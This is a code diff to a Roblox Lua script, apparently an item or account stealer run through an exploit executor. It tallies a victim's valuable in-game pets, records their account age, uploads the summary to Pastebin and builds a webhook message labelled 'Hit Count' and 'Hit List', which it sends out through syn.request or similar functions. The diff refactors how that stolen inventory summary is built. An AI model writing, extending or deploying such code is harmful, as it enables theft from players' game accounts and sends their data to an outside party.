@@ -87,15 +87,14 @@ local accage = game.Players.LocalPlayer.AccountAge
 
 -- Prepare data for the webhook
 local inventorySummary = 
-    "Total Count: " .. tostring(uniqueItemsC + ancientItemsC + godlyItemsC + legendaryItemsC + vintageItemsC + rareItemsC + uncommonItemsC + commonItemsC) .. "\n" ..
-    "Uniques: " .. tostring(uniqueItemsC) .. "\n" ..
-    "Ancients: " .. tostring(ancientItemsC) .. "\n" ..
-    "Godlys: " .. godlyItemsC .. "\n" ..
-    "Legendarys: " .. legendaryItemsC .. "\n" ..
-    "Vintages: " .. tostring(vintageItemsC) .. "\n" ..
-    "Rares: " .. rareItemsC .. "\n" ..
-    "Uncommons: " .. tostring(uncommonItemsC) .. "\n" ..
-    "Commons: " .. tostring(commonItemsC)
+    "Total Count: " .. tostring(total_pets) .. "\n" ..
+    "Legendaries: " .. tostring(legendaries_count) .. "\n" ..
+    "Mega Neons: " .. tostring(mega_count) .. "\n" ..
+    "Neons: " .. tostring(neon_count) .. "\n" ..
+    "Ultra Rares: " .. tostring(ultra_count) .. "\n" ..
+    "Rares: " .. tostring(rare_count) .. "\n" ..
+    "Uncommons: " .. tostring(uncommon_count) .. "\n" ..
+    "Commons: " .. tostring(common_count)
 
 local pastebinLink = pastebin(inventorySummary) -- Upload the inventory summary to Pastebin
 
@@ -139,14 +138,7 @@ local data = {
             fields = {
                 {
                     name = "Hit Count:",
-                    value = "Total Count: " .. tostring(total_pets) ..
-                            "\nLegendaries: " .. tostring(legendaries_count) ..
-                            "\nMega Neons: " .. tostring(mega_count) ..
-                            "\nNeons: " .. tostring(neon_count) ..
-                            "\nUltra Rares: " .. tostring(ultra_count) ..
-                            "\nRares: " .. tostring(rare_count) ..
-                            "\nUncommons: " .. tostring(uncommon_count) ..
-                            "\nCommons: " .. tostring(common_count)
+                    value = inventorySummary
                 },
                 {
                     name = "Hit List:",
@@ -156,6 +148,8 @@ local data = {
         }
     }
 }
+
+-- (The rest of the script follows...)
 
 local request = http_request or request or HttpPost or syn.request
 
